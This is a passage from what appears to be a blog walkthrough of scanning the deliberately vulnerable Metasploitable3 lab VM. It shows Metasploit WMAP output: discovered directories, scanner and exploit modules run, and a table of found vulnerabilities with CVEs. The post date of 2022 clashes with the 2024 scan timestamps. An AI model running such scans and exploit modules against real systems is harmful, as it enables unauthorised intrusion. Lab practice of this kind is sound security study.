\u0026#39;404\u0026#39; as not found for files with extension .zip [*] Using code \u0026#39;404\u0026#39; as not found for files with extension ~ [*] Using code \u0026#39;404\u0026#39; as not found for files with extension [+] Found http://10.0.2.28:80/chat 301 [+] Found http://10.0.2.28:80/phpmyadmin 301 [+] Found http://10.0.2.28:80/uploads 301 [*] Using code \u0026#39;404\u0026#39; as not found for files with extension [+] Found http://10.0.2.28:80/chat 301 [+] Found http://10.0.2.28:80/phpmyadmin 301 [+] Found http://10.0.2.28:80/uploads 301 [*] Module auxiliary/scanner/http/http_put [*] Path: / [-] 10.0.2.28: File doesn\u0026#39;t seem to exist. The upload probably failed [*] Module auxiliary/scanner/http/ms09_020_webdav_unicode_bypass [*] Path: / [-] 10.0.2.28:80 Folder does not require authentication. [405] [*] Module auxiliary/scanner/http/prev_dir_same_name_file [*] Path: / [-] Blank or default PATH set. [*] Module auxiliary/scanner/http/replace_ext [*] Module auxiliary/scanner/http/soap_xml [*] Path: / [*] Starting scan with 0ms delay between requests [*] Server 10.0.2.28:80 returned HTTP 404 for /. Use a different one. [*] Module auxiliary/scanner/http/trace_axd [*] Path: / [*] Module auxiliary/scanner/http/verb_auth_bypass [*] =[ Unique Query testing ]= ============================================================ [*] Module auxiliary/admin/vmware/vcenter_forge_saml_token [*] Module auxiliary/scanner/http/blind_sql_query [*] Module auxiliary/scanner/http/error_sql_injection [*] Module auxiliary/scanner/http/http_traversal [*] Module auxiliary/scanner/http/rails_mass_assignment [*] Module exploit/multi/http/lcms_php_exec [*] =[ Query testing ]= ============================================================ [*] =[ General testing ]= ============================================================ ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ Launch completed in 226.5683000087738 seconds. ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ [*] Done. [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; Type the wmap_vulns -l command to display the results of the scan 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; vulns Vulnerabilities =============== Timestamp Host Name References --------- ---- ---- ---------- 2024-02-19 10:00:51 UTC 10.0.2.28 Drupal HTTP Parameter Key/Value SQL Injection CVE-2014-3704,URL-https://www.drupal.org/SA-CORE -2014-005,URL-http://www.sektioneins.de/en/advis ories/advisory-012014-drupal-pre-auth-sql-inject ion-vulnerability.html,URL-https://www.whitewint erwolf.com/posts/2017/11/16/drupageddon-revisite d-a-new-path-from-sql-injection-to-remote-comman d-execution-cve-2014-3704/ 2024-02-19 14:37:58 UTC 10.0.2.28 ProFTPD 1.3.5 Mod_Copy Command Execution CVE-2015-3306,EDB-36742,URL-http://bugs.proftpd. org/show_bug.cgi?id=4169 2024-02-20 12:30:10 UTC 10.0.2.28 UnrealIRCD 3.2.8.1 Backdoor Command Execution CVE-2010-2075,OSVDB-65445,URL-http://www.unreali rcd.com/txt/unrealsecadvisory.20100612.txt 2024-02-20 13:01:20 UTC 10.0.2.28 SSH Login Check Scanner CVE-1999-0502 2024-02-21 03:19:30 UTC 10.0.2.28 Generic Payload Handler 2024-03-04 14:54:11 UTC 10.0.2.28 phpMyAdmin Authenticated Remote Code Execution v CVE-2013-3238,EDB-25003,OSVDB-92793,URL-http://w ia preg_replace() ww.waraxe.us/advisory-103.html,URL-http://www.ph pmyadmin.net/home_page/security/PMASA-2013-2.php 2024-03-04 14:59:03 UTC 10.0.2.28 Ruby on Rails ActionPack Inline ERB Code Executi CVE-2016-2098 on 2024-03-05 05:18:00 UTC 10.0.2.28 HTTP Host Header Injection Detection CVE-2016-10073,URL-http://www.skeletonscribe.net /2013/05/practical-http-host-header-attacks.html [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; ","date":"2022-02-18T00:00:00Z","permalink":"https://abriljordan.github.io/ajcasinillo/p/metasploitable3-vulnerability-scan/","title":"Metasploitable3 Vulnerability Scan"}]